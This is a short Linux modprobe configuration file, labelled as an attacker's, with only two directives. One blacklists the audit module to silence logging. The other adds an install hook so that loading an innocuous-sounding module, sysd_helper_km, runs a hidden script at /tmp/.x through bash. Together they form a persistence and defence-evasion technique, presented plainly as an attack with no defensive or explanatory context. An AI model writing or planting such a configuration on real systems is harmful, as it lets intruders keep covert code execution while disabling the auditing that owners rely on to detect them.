# Attacker modprobe configuration

# Silence audit if the module ever gets blacklisted elsewhere
blacklist audit

# Run the attacker helper when sysd_helper_km is loaded
install sysd_helper_km /bin/bash /tmp/.x
